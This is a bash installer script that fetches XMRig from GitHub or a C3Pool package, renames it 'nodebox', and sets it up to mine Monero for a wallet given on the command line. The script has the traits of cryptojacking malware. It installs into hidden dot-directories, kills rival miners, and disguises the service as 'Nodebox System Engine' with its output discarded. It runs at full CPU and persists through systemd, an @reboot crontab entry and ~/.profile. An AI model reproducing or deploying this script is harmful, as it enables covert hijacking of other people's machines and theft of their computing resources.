#!/usr/bin/env bash
VERSION="4.0-unified"
C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
SERVICE_NAME="nodebox.service"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="0xD3d_$(date +%s)"

log() {
  printf '%s\n' "$*"
}

fail() {
  printf 'ERROR: %s\n' "$*" >&2
  exit 1
}

# Tự động quét và chọn thư mục thực tế có quyền ghi để tránh lỗi /var/tmp bị khóa
INSTALL_DIR=""
for candidate in "$HOME/.nodebox" "/tmp/.nodebox" "./.nodebox" "/var/tmp/.nodebox"; do
    if mkdir -p "$candidate" 2>/dev/null && [ -w "$candidate" ]; then
        INSTALL_DIR="$candidate"
        break
    fi
done

if [ -z "$INSTALL_DIR" ]; then
    INSTALL_DIR="/tmp/.nodebox"
    mkdir -p "$INSTALL_DIR" 2>/dev/null || true
fi

ARCHIVE="$INSTALL_DIR/nodebox.tar.gz"

if [ -z "$WALLET" ]; then
  echo "Setup script v$VERSION"
  echo "Usage: $0 <wallet address or USDT TRC20 address> [email]"
  exit 1
fi

WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in
  106|95|34) ;;
  *) fail "Wrong wallet base address length: ${#WALLET_BASE}" ;;
esac

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in
  ''|*[!0-9]*) CPU_THREADS=1 ;;
esac

EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))
[ "$EXP_MONERO_HASHRATE" -gt 0 ] || EXP_MONERO_HASHRATE=1

get_port_based_on_hashrate() {
  local hashrate="$1"
  if [ "$hashrate" -le 5000 ]; then
    echo 80
  elif [ "$hashrate" -le 25000 ]; then
    echo 13333
  elif [ "$hashrate" -le 50000 ]; then
    echo 15555
  elif [ "$hashrate" -le 100000 ]; then
    echo 19999
  else
    echo 23333
  fi
}

PORT="$(get_port_based_on_hashrate "$EXP_MONERO_HASHRATE")"

log "Setup script v$VERSION"
log "CPU threads: $CPU_THREADS"
log "Computed C3Pool port: $PORT"
log "Directory: $INSTALL_DIR"

download_file() {
  local url="$1"
  local output="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 3 --connect-timeout 15 "$url" -o "$output"
  elif command -v wget >/dev/null 2>&1; then
    wget -O "$output" "$url"
  elif command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
    busybox wget "$url" -O "$output"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$output" <<'PY'
import sys, urllib.request
urllib.request.urlretrieve(sys.argv[1], sys.argv[2])
PY
  else
    return 1
  fi
}

download_text() {
  local url="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 3 --connect-timeout 15 -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --header='Accept: application/vnd.github+json' --user-agent='unified-installer' "$url"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" <<'PY'
import sys, urllib.request
req = urllib.request.Request(sys.argv[1], headers={"Accept": "application/vnd.github+json", "User-Agent": "unified-installer"})
with urllib.request.urlopen(req, timeout=20) as r:
    sys.stdout.write(r.read().decode("utf-8"))
PY
  else
    return 1
  fi
}

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in
    x86_64|amd64) ;;
    *) return 2 ;;
  esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

install_latest_official_xmrig() {
  local url version
  url="$(get_latest_xmrig_url)" || return $?
  version="$(basename "$url" | sed -E 's/^xmrig-([0-9.]+)-linux-static-x64\.tar\.gz$/\1/')"
  log "[*] Latest official XMRig detected: v$version"
  
  rm -rf "$INSTALL_DIR"/*
  mkdir -p "$INSTALL_DIR"
  rm -f "$ARCHIVE"

  download_file "$url" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" --strip-components=1 || return 1
  rm -f "$ARCHIVE"

  [ -f "$INSTALL_DIR/xmrig" ] || return 1
  mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/nodebox"
  chmod +x "$INSTALL_DIR/nodebox" 2>/dev/null || true
  return 0
}

install_c3pool_package() {
  log "[*] Falling back to C3Pool miner package"
  rm -rf "$INSTALL_DIR"/*
  mkdir -p "$INSTALL_DIR"
  rm -f "$ARCHIVE"

  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" || return 1
  rm -f "$ARCHIVE"

  if [ -f "$INSTALL_DIR/xmrig" ]; then
    mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/nodebox"
  fi
  chmod +x "$INSTALL_DIR/nodebox" 2>/dev/null || true
  [ -f "$INSTALL_DIR/nodebox" ]
}

if command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  sudo systemctl stop "$SERVICE_NAME" 2>/dev/null || true
  sudo systemctl stop c3pool_miner.service 2>/dev/null || true
fi
pkill -x nodebox 2>/dev/null || true
pkill -x xmrig 2>/dev/null || true

log "[*] Preparing miner package"
if ! install_latest_official_xmrig; then
  log "WARNING: Could not download the latest official release. Attempting fallback."
  if ! install_c3pool_package; then
    fail "Unable to download either the latest official XMRig release or the C3Pool fallback package."
  fi
fi

if ! "$INSTALL_DIR/nodebox" --help >/dev/null 2>&1; then
  log "WARNING: Bundled core is not functional on this host."
  if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
    if command -v apk >/dev/null 2>&1 && apk add --no-cache xmrig >/dev/null 2>&1 && command -v xmrig >/dev/null 2>&1; then
      cp "$(command -v xmrig)" "$INSTALL_DIR/nodebox"
      chmod +x "$INSTALL_DIR/nodebox"
    else
      fail "Alpine backup fallback failed"
    fi
  else
    fail "Binary is not functional"
  fi
fi

cat > "$INSTALL_DIR/config.json" <<EOF_CONFIG
{
    "autosave": true,
    "background": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "auto.c3pool.org:$PORT",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:19999",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:443",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:80",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "auto.c3pool.org:33333",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": true
        },
        {
            "url": "auto.c3pool.org:23333",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        }
    ],
    "log-file": null,
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": false
}
EOF_CONFIG

cp "$INSTALL_DIR/config.json" "$INSTALL_DIR/config_background.json"
sed -i 's/"background": false/"background": true/' "$INSTALL_DIR/config_background.json"

cat > "$INSTALL_DIR/nodebox.sh" <<EOF_MINER
#!/usr/bin/env bash
if ! pidof nodebox >/dev/null 2>&1; then
  if [ "\$#" -eq 0 ]; then
    exec nice "$INSTALL_DIR/nodebox" --config="$INSTALL_DIR/config.json"
  else
    exec nice "$INSTALL_DIR/nodebox" "\$@"
  fi
fi
EOF_MINER
chmod +x "$INSTALL_DIR/nodebox.sh"

start_without_systemd() {
  "$INSTALL_DIR/nodebox.sh" --config="$INSTALL_DIR/config_background.json" >/dev/null 2>&1 &
}

if command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  log "[*] Installing systemd service"
  
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "vm.nr_hugepages=$((1168 + CPU_THREADS))" | sudo tee -a /etc/sysctl.conf >/dev/null
    sudo sysctl -w vm.nr_hugepages=$((1168 + CPU_THREADS)) >/dev/null 2>&1
  fi

  cat > "$INSTALL_DIR/nodebox.service" <<EOF_SERVICE
[Unit]
Description=Nodebox System Engine
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=$INSTALL_DIR/nodebox --config=$INSTALL_DIR/config.json
StandardOutput=null
StandardError=null
Restart=always
RestartSec=5
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  if [ -w /etc/systemd/system ]; then
      sudo cp "$INSTALL_DIR/nodebox.service" "/etc/systemd/system/$SERVICE_NAME"
      sudo systemctl daemon-reload
      sudo systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
      sudo systemctl restart "$SERVICE_NAME"
  else
      start_without_systemd
  fi
else
    start_without_systemd

    CRON_LINE="@reboot $INSTALL_DIR/nodebox.sh --config=$INSTALL_DIR/config_background.json >/dev/null 2>&1"
    (crontab -l 2>/dev/null | grep -F -q "$CRON_LINE") || {
        (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab - 2>/dev/null || true
    }

    if [ -n "$HOME" ] && [ -w "$HOME" ]; then
        PROFILE="$HOME/.profile"
        START_LINE="$INSTALL_DIR/nodebox.sh --config=$INSTALL_DIR/config_background.json >/dev/null 2>&1"
        
        touch "$PROFILE" 2>/dev/null || true
        if [ -w "$PROFILE" ] && ! grep -F "$START_LINE" "$PROFILE" >/dev/null 2>&1; then
            printf '\n%s\n' "$START_LINE" >> "$PROFILE"
        fi
    fi
fi

sleep 2
log "[*] Setup complete - miner initialized"